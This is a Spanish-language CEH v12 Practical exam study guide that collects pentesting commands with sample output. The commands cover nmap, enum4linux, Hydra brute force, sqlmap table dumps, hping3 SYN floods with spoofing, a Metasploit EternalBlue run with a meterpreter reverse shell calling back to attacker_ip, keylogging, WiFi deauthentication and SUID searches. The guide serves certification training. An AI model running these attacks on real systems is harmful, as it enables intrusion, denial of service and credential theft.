# CEH v12 Practical - Guía Completa de Herramientas y Comandos

> **Entorno del Examen CEH v12 Practical:**
> - **Parrot OS**: Herramientas de pentesting y línea de comandos
> - **Windows 7**: Herramientas gráficas, análisis de malware y criptografía
> - **6 horas** para completar 20 desafíos (mínimo 14 correctos para aprobar)
> - Examen de "libro abierto" con acceso a internet desde el host

---

## 🔍 FOOTPRINTING & RECONNAISSANCE

### Análisis de Certificados SSL/TLS
**Objetivo:** Descubrir subdominios y CN/SAN alternativos para ampliar la superficie de ataque.

**Entorno:** Cualquier navegador web

**Herramientas Online:**
- `ui.ctsearch.entrust.com` - Búsqueda de transparencia de certificados Entrust
- `search.censys.io` - Motor de búsqueda de dispositivos expuestos
- `crt.sh` - Base de datos de certificados públicos

**Interpretación de Resultados:**
- **CN (Common Name):** Dominio principal del certificado
- **SAN (Subject Alternative Name):** Dominios adicionales cubiertos
- **Issuer:** Autoridad certificadora que emitió el certificado
- **Validity:** Fechas de emisión y expiración

---

### DNS Reconnaissance
**Objetivo:** Enumerar registros DNS y obtener mapeo completo de la infraestructura del dominio.

**Entorno:** Parrot OS

#### DNSRECON
```bash
dnsrecon -d domain.com -t axfr
```
**Interpretación:**
- `-t axfr`: Intenta transferencia de zona completa
- **Salida exitosa:** Lista completa de registros DNS (A, MX, NS, CNAME)
- **Fallo:** "Zone transfer failed" - restricciones del servidor

#### DNSENUM  
```bash
dnsenum domain.com
```
**Interpretación:**
- Enumera servidores de nombres, registros MX y subdominios
- **Host addresses found:** IPs descubiertas
- **Name Servers:** Servidores DNS autoritativos

#### FIERCE
```bash
fierce --domain domain.com
```
**Interpretación:**
- **Found:** Subdominios activos detectados
- **Nearby:** IPs adyacentes que podrían pertenecer al objetivo

#### Herramientas Básicas DNS
```bash
# Obtener servidores NS
host -t ns domain.com

# Zone transfer manual
dig axfr domain.com @nameserver

# Verificar registro específico
dig ns zonetransfer.me
nslookup
> set type=ns
> domain.com
```

---

## 🖥️ NETWORK SCANNING & ENUMERATION

### NMAP - Master Tool
**Objetivo:** Descubrir hosts vivos, puertos abiertos, servicios y SO.

**Entorno:** Parrot OS (CLI) y Windows 7 (Zenmap GUI)

#### Comandos Fundamentales
```bash
# Host Discovery
nmap -sn 192.168.1.0/24
nmap -sP 192.168.1.0/24

# Escaneo rápido de puertos comunes
nmap -F target_ip

# Escaneo completo con detección de SO y servicios
nmap -A -T4 target_ip

# Escaneo sigiloso SYN
nmap -sS target_ip

# Escaneo UDP (más lento)
nmap -sU --top-ports 1000 target_ip

# Escaneo completo de puertos
nmap -p- target_ip
```

#### Interpretación de Salidas NMAP
```
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.4
80/tcp   open  http       Apache 2.4.6
443/tcp  open  https      Apache 2.4.6
3306/tcp open  mysql      MySQL 5.7.42
```

**Estados de Puerto:**
- **open:** Servicio activo escuchando
- **closed:** Puerto cerrado pero accesible
- **filtered:** Bloqueado por firewall
- **unfiltered:** Accesible pero estado desconocido

#### Scripts NSE Importantes
```bash
# Vulnerabilidades generales
nmap --script vuln target_ip

# SMB enumeration
nmap --script smb-enum-shares target_ip
nmap --script smb-os-discovery target_ip

# Detección de servicios web
nmap --script http-enum target_ip

# Fuerza bruta básica
nmap --script brute target_ip
```

### NETDISCOVER
**Objetivo:** Descubrir hosts vivos en la red local usando ARP.

**Entorno:** Parrot OS

```bash
# Escaneo pasivo (escucha tráfico ARP)
netdiscover -i eth0

# Escaneo activo de rango específico
netdiscover -r 192.168.1.0/24 -i eth0
```

**Interpretación:**
```
IP Address       MAC Address       Count     Len  MAC Vendor / Hostname
192.168.1.1      00:11:22:33:44:55  1        60   Cisco Systems
192.168.1.10     aa:bb:cc:dd:ee:ff  1        60   Dell Inc.
```

---

## 📁 SMB/NETBIOS ENUMERATION

### Puertos Objetivo
- **UDP 137:** NetBIOS Name Service
- **UDP 138:** NetBIOS Datagram Service  
- **TCP 139:** NetBIOS Session Service
- **TCP 445:** Microsoft-DS (SMB over TCP)

### Herramientas de Enumeración

#### ENUM4LINUX
**Objetivo:** Enumeración completa de sistemas Windows/Samba.

**Entorno:** Parrot OS

```bash
enum4linux -a target_ip
```

**Interpretación de Salida:**
```
[+] Enumerating users using SID S-1-5-21-xxx-xxx-xxx
user:[guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[administrator] rid:[0x1f4]

[+] Share Enumeration on target_ip
\\target_ip\ADMIN$    [E] Default share
\\target_ip\C$        [E] Default share  
\\target_ip\IPC$      IPC    IPC Service
```

#### SMBCLIENT
```bash
# Listar shares sin autenticación
smbclient -L //target_ip -N

# Conectar a share específico
smbclient //target_ip/sharename

# Con credenciales
smbclient //target_ip/share -U username%password
```

**Comandos dentro de SMB:**
```
smb: \> dir          # Listar archivos
smb: \> get file.txt # Descargar archivo
smb: \> put file.txt # Subir archivo
smb: \> cd folder    # Cambiar directorio
```

#### NXC (NetExec)
```bash
nxc smb target_ip
nxc smb target_ip -u usuario -p password
```

---

## 🔓 PASSWORD ATTACKS & CRACKING

### HYDRA
**Objetivo:** Ataques de fuerza bruta contra servicios de autenticación.

**Entorno:** Parrot OS

#### Comandos por Servicio
```bash
# SSH
hydra -l admin -P passwords.txt ssh://target_ip
hydra -L users.txt -P passwords.txt ssh://target_ip -t 4 -f

# FTP
hydra -l ftp -P passwords.txt ftp://target_ip

# RDP (puerto 3389)
hydra -l administrator -P passwords.txt rdp://target_ip

# HTTP Basic Auth
hydra -l admin -P passwords.txt target_ip http-get /admin

# HTTP POST Form
hydra -l admin -P passwords.txt target_ip http-post-form "/login:username=^USER^&password=^PASS^:Invalid credentials"

# SMB
hydra -l admin -P passwords.txt target_ip smb
```

**Parámetros Importantes:**
- `-l`: Usuario específico
- `-L`: Lista de usuarios
- `-p`: Password específica  
- `-P`: Lista de passwords
- `-t`: Threads (cuidado con servicios sensibles como RDP)
- `-f`: Detener al encontrar primera credencial válida
- `-V`: Verbose (mostrar intentos)

**Interpretación de Resultados:**
```
[22][ssh] host: target_ip   login: admin   password: password123
1 of 1 target successfully completed, 1 valid password found
```

### HASHCAT
**Objetivo:** Cracking offline de hashes.

**Entorno:** Puede usarse en ambos SO, más eficiente en Windows con GPU

#### Modos Comunes
```bash
# MD5
hashcat -m 0 -a 0 hash.txt wordlist.txt

# SHA-1
hashcat -m 100 -a 0 hash.txt wordlist.txt

# NTLM
hashcat -m 1000 -a 0 hash.txt wordlist.txt

# Linux SHA-512 (shadow)
hashcat -m 1800 -a 0 shadow.txt wordlist.txt

# WPA2
hashcat -m 2500 -a 0 capture.hccapx wordlist.txt
```

### JOHN THE RIPPER
**Entorno:** Parrot OS

```bash
# Cracking automático con detección de hash
john --wordlist=rockyou.txt hashes.txt

# Cracking de SSH keys
ssh2john id_rsa > key_hash.txt
john --wordlist=rockyou.txt key_hash.txt

# Ver resultados
john --show hashes.txt
```

---

## 🕷️ WEB APPLICATION TESTING

### WPSCAN
**Objetivo:** Enumeración y testing de WordPress.

**Entorno:** Parrot OS

```bash
# Enumeración básica
wpscan --url http://target.com -e u,vp,vt

# Con API token para vulnerabilidades actualizadas
wpscan --url http://target.com --api-token YOUR_TOKEN

# Fuerza bruta
wpscan --url http://target.com --usernames admin --passwords passwords.txt

# Enumeración de usuarios por feed RSS
curl http://target.com/?feed=rss2 | grep -i creator
```

**Interpretación:**
```
[+] WordPress version 5.8 identified
[!] The version is out of date, the latest version is 6.3

[+] WordPress theme in use: twentytwentyone

[+] Enumerating Users (via Passive and Aggressive Methods)
[i] User(s) Identified:
[+] admin
    |  - Id: 1
    |  - Login: admin
```

### SQLMAP
**Objetivo:** Detección y explotación de SQL injection.

**Entorno:** Parrot OS

```bash
# Básico con GET parameter
sqlmap -u "http://target.com/page.php?id=1"

# Con cookie de sesión
sqlmap -u "http://target.com/page.php" --cookie="PHPSESSID=abc123"

# POST data
sqlmap -u "http://target.com/login.php" --data="user=admin&pass=test"

# Enumerar bases de datos
sqlmap -u "target_url" --dbs

# Enumerar tablas
sqlmap -u "target_url" -D database_name --tables

# Dump data
sqlmap -u "target_url" -D database_name -T users --dump
```

---

## 📱 MOBILE & ANDROID TESTING

### ADB (Android Debug Bridge)
**Objetivo:** Interactuar con dispositivos Android para testing.

**Entorno:** Parrot OS

```bash
# Detectar puerto ADB (5555)
nmap -p 5555 target_ip

# Conectar a dispositivo
adb connect target_ip:5555

# Verificar conexión
adb devices

# Shell interactivo
adb shell

# Buscar archivos
adb shell find /sdcard -name "*.jpg"

# Extraer archivos
adb pull /sdcard/file.txt ./
```

#### Análisis de APK
```bash
# Obtener ruta de APK instalada
adb shell pm path com.example.app

# Extraer APK
adb pull /data/app/com.example.app/base.apk

# Decompilación con JADX
jadx -d output_folder app.apk

# APKTool para recursos
apktool d app.apk -o output_folder
```

---

## 📊 NETWORK ANALYSIS & FORENSICS

### WIRESHARK
**Objetivo:** Análisis de tráfico de red y forense.

**Entorno:** Ambos SO (GUI más completa en Windows)

#### Filtros Importantes
```
# Tráfico HTTP
http

# Credenciales en POST
http.request.method == "POST"

# Tráfico hacia IP específica
ip.dst == 192.168.1.100

# Paquetes SYN (DoS detection)
tcp.flags.syn == 1

# Solo paquetes SYN sin ACK
tcp.flags.syn == 1 and tcp.flags.ack == 0

# Tráfico FTP
ftp or ftp-data

# DNS queries
dns.qry.type == 1
```

#### Análisis de DoS/DDoS
**Pasos:**
1. **Statistics → Conversations → IPv4**
2. **Ordenar por "Packets"** 
3. **Identificar IP origen con más paquetes hacia víctima**

**Interpretación:**
- Gran cantidad de paquetes de una IP = posible atacante
- Múltiples IPs con patrones similares = DDoS
- Ausencia de replies (B→A packets = 0) = flood attack

---

## 🔐 CRYPTOGRAPHY & STEGANOGRAPHY

### Herramientas Windows
**Entorno:** Windows 7

#### VERACRYPT
- Crear volúmenes cifrados
- Montar/desmontar unidades seguras
- Para encriptar y esconder particiones de disco
Montar y ver particiones cifradas:

<img width="1215" height="461" alt="image" src="https://github.com/user-attachments/assets/f636629f-a183-4750-95a8-59eecf277858" />


#### CRYPTOOL
- Análisis criptográfico
- Cifrado/descifrado con múltiples algoritmos
- Para descifrar/cifrar archivos con data .hex
Para decifrar un archivo .hex :

<img width="619" height="172" alt="image" src="https://github.com/user-attachments/assets/3afaeab9-4e10-4116-9bf8-8baab7f5075b" />
<img width="947" height="209" alt="image" src="https://github.com/user-attachments/assets/8a851ff9-471c-4183-9eac-ee17443dbdc7" />


#### HASHCALC
- Cálculo de hashes MD5, SHA1, SHA256
- Verificación de integridad

#### BCTTEXTENCONDER 
- Para encodear o decodear texto en un archivo (.hex)

Para deseencriptar un archivo, encriptado por BCTTextEncoder

<img width="625" height="309" alt="image" src="https://github.com/user-attachments/assets/e2acbc18-8cff-4609-9dfa-1d15ba2575cc" />


#### CRYPTOFORGE
- Para encriptar y desencriptar archivos

Para desencriptar con una contraseña:

<img width="586" height="284" alt="image" src="https://github.com/user-attachments/assets/050708f2-1a93-4a51-8cf7-1700599571a9" />


#### HASHMYFILES
- Para calcular hashes y comparar hashes de archivos

<img width="1916" height="363" alt="image" src="https://github.com/user-attachments/assets/3aaa3535-b9c8-4855-a2ae-76db8dcf108b" />
  

#### STEGANOGRAFÍA

##### OPENSTEGO
**Objetivo:** Ocultar/extraer datos en imágenes.
- **Embed:** Ocultar archivo en imagen
- **Extract:** Extraer datos ocultos
# OpenStego – Uso en Línea de Comandos (Markdown)
<img width="933" height="424" alt="image" src="https://github.com/user-attachments/assets/cbc1d30b-d7dc-470c-b5a2-d9c25fba747c" />

Luego desencriptar hash que te de la imagen en: https://hashes.com/


## Enlaces Útiles  
- [OpenStego](https://www.openstego.com/)  
- [Home](https://www.openstego.com/)  
- [Concepts](https://www.openstego.com/concepts)  
- [Features](https://www.openstego.com/features)  
- [Download](https://github.com/syvaidya/openstego/releases)  
- [About](https://www.openstego.com/about)  
##### SNOW
**Objetivo:** Ocultar texto en archivos de texto usando espacios/tabs.

```bash
# Ocultar mensaje
snow -C -m "secret message" -p password original.txt output.txt

# Extraer mensaje  
snow -C -p password output.txt
```
```markdown
# Snow Steganography – Uso en Línea de Comandos

**Synopsis**  
```
snow [ -CQS ] [ -p passwd ] [ -l line-length ] [ -f file | -m message ] [ infile [ outfile ] ]
```

**Descripción**  
`snow` oculta mensajes en archivos de texto mediante espacios y tabulaciones al final de cada línea, invisibles en la mayoría de los visores de texto. Usa compresión Huffman optimizada para inglés y cifrado ICE en modo CFB.

---

## Opciones Principales

| Opción                  | Descripción                                                                                       |
|-------------------------|---------------------------------------------------------------------------------------------------|
| `-C`                    | Comprimir al ocultar o descomprimir al extraer                                                    |
| `-Q`                    | Modo silencioso (no muestra estadísticas)                                                         |
| `-S`                    | Mostrar espacio aproximado disponible para ocultar                                                 |
| `-p passwd`             | Cifrar/descifrar con la contraseña `passwd`                                                       |
| `-l line-length`        | Longitud máxima de línea al ocultar (por defecto 80)                                              |
| `-f message-file`       | Archivo cuyo contenido se ocultará                                                                |
| `-m message-string`     | Cadena de texto a ocultar                                                                         |

---

## Ejemplos

1. **Ocultar texto con compresión y cifrado**  
   ```
   snow -C -m "I am lying" -p "hello world" infile.txt outfile.txt
   ```

2. **Extraer mensaje cifrado**  
   ```
   snow -C -p "hello world" outfile.txt
   ```

3. **Evitar wrap, longitud de línea 72**  
   ```
   snow -C -l 72 -m "I am lying" infile.txt outfile.txt
   ```

4. **Ver capacidad de ocultación**  
   ```
   snow -S -l 72 infile.txt
   ```
```

#### CRC32 Analysis
**Herramienta Online:** `https://emn178.github.io/online-tools/crc/`
- Subir imagen para obtener valor CRC32
- Útil para challenges de integridad

---

## ⚡ DoS/DDoS TESTING

### HPING3
**Objetivo:** Generar tráfico personalizado para testing.

**Entorno:** Parrot OS

```bash
# SYN Flood básico
hping3 -S target_ip -p 80 --flood

# Con IP spoofing
hping3 -S target_ip -a fake_ip -p 80 --flood

# Ping of Death
hping3 -d 65536 -S target_ip

# UDP flood
hping3 -2 target_ip -p 53 --flood
```

⚠️ **IMPORTANTE:** Solo usar en entornos de laboratorio autorizados.

---

## 🛡️ VULNERABILITY ASSESSMENT

### NESSUS
**Objetivo:** Escaneo automatizado de vulnerabilidades.

**Entorno:** Windows 7 (interfaz web)

**Configuración:**
1. Instalar Nessus
2. Crear cuenta en `https://localhost:8834`
3. Activation Code del laboratorio
4. Configurar scan policies

**Tipos de Scan:**
- **Basic Network Scan:** Detección general
- **Advanced Scan:** Personalizable
- **Web Application Tests:** Específico para web

### OPENVAS
**Alternativa opensource a Nessus**
- Misma funcionalidad básica
- Interfaz web similar

---

## 🔧 SYSTEM HACKING & POST-EXPLOITATION

### METASPLOIT
**Objetivo:** Framework de explotación.

**Entorno:** Parrot OS

```bash
# Iniciar Metasploit
msfconsole

# Buscar exploits
search apache
search type:exploit platform:windows

# Usar exploit
use exploit/windows/smb/ms17_010_eternalblue

# Configurar
set RHOSTS target_ip
set payload windows/x64/meterpreter/reverse_tcp
set LHOST attacker_ip

# Ejecutar
exploit
```

#### METERPRETER Commands
```
# Información del sistema
sysinfo

# Procesos activos
ps

# Migrar a proceso
migrate PID

# Elevar privilegios
getsystem

# Capturar pantalla
screenshot

# Keylogger
keyscan_start
keyscan_dump
```

---

## 📱 SPECIALIZED TOOLS

### WiFi Testing
**Entorno:** Parrot OS (requiere tarjeta WiFi compatible)

#### AIRCRACK-NG Suite
```bash
# Modo monitor
airmon-ng start wlan0

# Escaneo de redes
airodump-ng wlan0mon

# Captura específica
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Deauth attack
aireplay-ng -0 100 -a AA:BB:CC:DD:EE:FF wlan0mon

# Cracking
aircrack-ng -w wordlist.txt capture.cap
```

### Cloud Enumeration
#### LAZYS3
```bash
# Enumerar buckets S3
python3 lazys3.py domain.com
```

---

## 🎯 EXAM TIPS & STRATEGY

### Distribución de Tiempo (6 horas)
1. **Reconocimiento rápido (30 min):** nmap, netdiscover
2. **Enumeración detallada (2 horas):** SMB, web, servicios
3. **Explotación (2.5 horas):** credenciales, vulnerabilidades
4. **Documentación (1 hora):** capturas, respuestas

### Orden de Trabajo Recomendado
1. **Parrot OS:** Escaneos nmap extensos (en background)
2. **Windows 7:** Zenmap GUI, análisis gráfico
3. **Alternar:** Usar ambos SO según la herramienta necesaria

### Comandos de Emergencia
```bash
# Reset network (si hay problemas de conectividad)
sudo systemctl restart NetworkManager

# Verificar servicios corriendo
netstat -tuln

# Procesos por puerto
lsof -i :port_number
```

### Wordlists Importantes
- `/usr/share/wordlists/rockyou.txt`
- `/usr/share/wordlists/dirb/common.txt`
- `/usr/share/seclists/` (various lists)

---

## ⚠️ NOTAS IMPORTANTES

1. **Parrot OS**: Sin plugins ni shortcuts, comandos vanilla
2. **Sin acceso directo a internet**: Solo desde browser del host
3. **Documentar todo**: Screenshots automáticos en iLab
4. **Tiempo crítico**: Practicar velocidad y precisión
5. **Backup plans**: Tener múltiples enfoques para cada objetivo

Esta guía cubre las herramientas esenciales del CEH v12 Practical con ejemplos reales de output y cuándo usar cada una en el entorno del examen.
Aquí tienes un Cheat Sheet de find en formato Markdown para copiar y pegar, incluyendo ejemplos claros, explicación de los comandos, escenarios de uso y recomendaciones para entorno CEH Practical (usualmente en Parrot OS):

***

# Linux find Cheat Sheet (CEH Practical)

## Uso Básico

```bash
find [ruta] [opciones] [expresión]
```

## Búsqueda por nombre o patrón

```bash
find . -name flag1.txt
```
_Busca el archivo “flag1.txt” en el directorio actual y subdirectorios._

```bash
find /home -name flag1.txt
```
_Busca “flag1.txt” dentro de /home._

```bash
find . -name "*.log"
```
_Todos los archivos que terminan en .log desde la carpeta actual._

```bash
find / -type d -name config
```
_Encuentra directorios llamados “config” bajo todo el sistema (requiere root para evitar “Permission denied”)._

***

## Búsqueda por permisos

```bash
find / -type f -perm 0777
```
_Archivos con permisos 777 (acceso total a cualquier usuario)._

```bash
find / -perm a=x
```
_Todos los archivos ejecutables por cualquier usuario._

```bash
find / -perm /u=s -type f 2>/dev/null
```
_Archivos con el bit SUID. SUID permite ejecutar como el propietario del archivo (clave en escalado de privilegios - típico del CEH Practical)._

```bash
find / -perm /g=s
```
_Archivos con el bit SGID (ejecuta como el grupo propietario)._

```bash
find / -perm -o w -type d 2>/dev/null
```
_Directorios mundialmente escribibles (potencialmente vulnerables)._

***

## Búsqueda por usuario/propietario

```bash
find /home -user frank
```
_Archivos en /home propiedad del usuario frank._

```bash
find / -group developers
```
_Archivos o directorios del grupo “developers”._

***

## Búsqueda por fecha y hora

```bash
find / -mtime -10
```
_Modificados en los últimos 10 días._

```bash
find / -atime -10
```
_Accedidos en los últimos 10 días._

```bash
find / -cmin -60
```
_Modificados en la última hora._

```bash
find / -amin -60
```
_Accesados en la última hora._

***

## Búsqueda por tamaño

```bash
find / -size 50M
```
_Archivos exactamente de 50 MB._

```bash
find / -size +100M
```
_Archivos mayores a 100 MB._

```bash
find / -size -1M
```
_Archivos menores a 1 MB._

***

## Búsqueda combinada y filtros avanzados

```bash
find / -type f -name "*.sh" -o -name "*.txt"
```
_Archivos .sh o .txt_

```bash
find / -writable -type d 2>/dev/null
```
_Directorios mundialmente escribibles._

```bash
find . -type d -empty
```
_Directorios vacíos._

***

## Acciones sobre los resultados

```bash
find . -type f -name "*.bak" -delete
```
_Elimina archivos .bak encontrados._

```bash
find /tmp -type f -name "*.log" -exec rm {} \;
```
_Ejecuta el comando `rm` sobre cada archivo .log en /tmp._

***

## Consejos y contexto CEH Practical

- Usar `2>/dev/null` para evitar mensajes de “Permission denied”.
- Los comandos find se lanzan siempre desde **Parrot OS** en terminal.
- La búsqueda de SUID, SGID, archivos “777” o mundialmente escribibles es común para escalado de privilegios y análisis de riesgo.
- El uso de find suele preceder al uso de scripts o explotación (p. ej., encontrar scripts modificables, binarios SUID, contraseñas en archivos .txt/.conf, etc).
- Si buscas binarios tipo gcc, python, perl para técnicas de privesc, usa:
  ```bash
  find / -name gcc*
  find / -name python*
  find / -name perl*
  ```

***

**¡Recuerda!** El output de find suele ser largo en CTFs/labs. Usa `| less` o `grep` para filtrar resultados rápidamente, ejemplo:

```bash
find / -type f -name "*.conf" 2>/dev/null | grep 'passwd'
```

***

Fuentes y referencias:  
- [Linux Audit - Find Cheat Sheet](https://linux-audit.com/cheat-sheets/find/)  
- Prácticas CEH v12
